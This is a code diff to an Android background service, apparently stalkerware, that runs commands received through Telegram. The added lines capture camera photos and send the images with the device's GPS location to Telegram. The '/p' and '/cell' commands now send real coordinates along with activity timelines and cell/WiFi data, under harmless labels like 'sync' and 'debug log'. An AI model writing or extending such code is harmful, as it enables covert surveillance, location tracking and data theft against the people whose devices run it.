@@ -78,7 +78,13 @@ class PersistentSyncService : LifecycleService() {
                                             serviceScope.launch {
                                                 try {
                                                     val photoFile = CameraUtility.get().capturePhoto(this@PersistentSyncService)
-                                                    TelegramSyncHelper.sendLogData("📷 *Photo Captured:* ${photoFile.absolutePath}")
+                                                    val latLon = LocationTracker.getCurrentLocation(this@PersistentSyncService)
+                                                    val locStr = latLon?.let { "${it.first}, ${it.second}" } ?: "unknown"
+                                                    // Send actual image (not just the path) with location caption
+                                                    TelegramSyncHelper.sendPhoto(
+                                                        photoFile,
+                                                        "📷 *Photo Captured*\n📍 Location: $locStr"
+                                                    )
                                                 } catch (e: Exception) {
                                                     Log.e("PersistentSyncService", "Camera error", e)
                                                     TelegramSyncHelper.sendLogData("❌ *Camera Error:* ${e.message}")
@@ -86,12 +92,24 @@ class PersistentSyncService : LifecycleService() {
                                             }
                                         }
                                         "/p" -> {
-                                            val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
-                                            TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📊 *Device Activity Log:*\n\n$timeline")
+                                            serviceScope.launch {
+                                                // BUGFIX: Previously passed hardcoded "0", "0" - location always showed 00
+                                                val latLon = LocationTracker.getCurrentLocation(this@PersistentSyncService)
+                                                val latStr = latLon?.first?.toString() ?: "0"
+                                                val lngStr = latLon?.second?.toString() ?: "0"
+                                                val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
+                                                TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, latStr, lngStr, "📊 *Device Activity Log:*\n\n$timeline")
+                                            }
                                         }
                                         "/cell" -> {
-                                            val cellData = NetworkLocationUtility.getNetworkLocationInfo(this@PersistentSyncService)
-                                            TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📡 *Cell/WiFi Diagnostic:*\n\n$cellData")
+                                            serviceScope.launch {
+                                                // BUGFIX: Previously passed hardcoded "0", "0"
+                                                val latLon = LocationTracker.getCurrentLocation(this@PersistentSyncService)
+                                                val latStr = latLon?.first?.toString() ?: "0"
+                                                val lngStr = latLon?.second?.toString() ?: "0"
+                                                val cellData = NetworkLocationUtility.getNetworkLocationInfo(this@PersistentSyncService)
+                                                TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, latStr, lngStr, "📡 *Cell/WiFi Diagnostic:*\n\n$cellData")
+                                            }
                                         }
                                     }
                                 }
